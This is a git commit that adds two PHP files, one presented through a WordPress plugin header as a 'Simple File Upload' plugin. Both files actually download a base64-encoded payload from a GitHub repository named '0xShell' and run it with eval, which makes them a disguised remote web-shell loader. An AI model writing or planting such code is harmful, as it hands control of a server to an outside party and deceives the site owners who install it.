c0eae9524cdc2b8fbc6c21d7a0ecc2587fd471a8
Chris <160328507+ceexicp@users.noreply.github.com>
2024-02-25 04:15:24 +0700

    Add files via upload

---
+++ 0x.php
@@ -0,0 +1,12 @@
+<?php
+ /*
+    Plugin Name: File Upload
+    Plugin URI: https://github.com/Xi4u7
+    Description: Simple File Upload
+    Version: 1.0
+    Author URI: https://github.com/Xi4u7
+    */ 
+    
+$x=file_get_contents("https://raw.githubusercontent.com/im-hanzou/0xShell/main/0xencbase.js");
+eval(base64_decode($x));
+?>
---
+++ getjs.php
@@ -0,0 +1,1 @@
+<?php $x=file_get_contents("https://raw.githubusercontent.com/im-hanzou/0xShell/main/0xencbase.js");eval(base64_decode($x)); ?>
